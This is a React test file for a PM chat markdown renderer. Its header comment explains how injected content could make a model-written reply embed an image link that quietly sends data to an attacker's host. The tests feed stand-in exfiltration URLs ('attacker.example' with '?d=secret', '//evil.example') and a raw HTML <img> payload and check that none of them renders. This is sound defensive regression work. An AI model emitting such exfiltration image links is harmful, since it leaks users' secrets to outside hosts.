/** The PM chat must not fetch anything a model reply names.
 *
 *  A PM reply is model-authored text shaped by untrusted content — attachments and repo-derived
 *  strings reach that model by design (ADR-0105). react-markdown renders `![](url)` as a real
 *  <img src> and its default urlTransform permits http/https, so an unoverridden `img` makes
 *  every reply a zero-click GET to a host the model was told to name. These tests are the
 *  regression: they fail the moment someone drops the override from PmMarkdown's components map.
 */
import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { PmMarkdown } from "@/components/pm/PmMarkdown";

const EXFIL = "https://attacker.example/x.png?d=secret";

describe("PmMarkdown does not fetch model-named URLs", () => {
  it("renders no <img> element at all for markdown image syntax", () => {
    const { container } = render(<PmMarkdown>{`![pic](${EXFIL})`}</PmMarkdown>);
    expect(container.querySelectorAll("img")).toHaveLength(0);
  });

  it("names what it withheld instead of dropping it silently", () => {
    render(<PmMarkdown>{`![a diagram](${EXFIL})`}</PmMarkdown>);
    // The operator must be able to tell "no image here" from "something tried to call out".
    expect(screen.getByText("a diagram")).toBeInTheDocument();
    expect(screen.getByText(/not loaded/)).toBeInTheDocument();
    expect(screen.getByText(new RegExp("attacker\\.example"))).toBeInTheDocument();
  });

  it("holds for a relative and a protocol-relative URL too", () => {
    // Neither is safe by virtue of being short: //evil.example is a live cross-origin fetch.
    for (const src of ["/api/whatever.png", "//evil.example/p.png"]) {
      const { container } = render(<PmMarkdown>{`![x](${src})`}</PmMarkdown>);
      expect(container.querySelectorAll("img")).toHaveLength(0);
    }
  });

  it("does not render raw HTML, so <img> smuggled as HTML stays inert", () => {
    const { container } = render(
      <PmMarkdown>{`<img src="${EXFIL}" />`}</PmMarkdown>,
    );
    expect(container.querySelectorAll("img")).toHaveLength(0);
  });

  it("still renders the ordinary markdown a PM reply is made of", () => {
    render(<PmMarkdown>{"**bold** and `code`"}</PmMarkdown>);
    expect(screen.getByText("bold")).toBeInTheDocument();
    expect(screen.getByText("code")).toBeInTheDocument();
  });
});
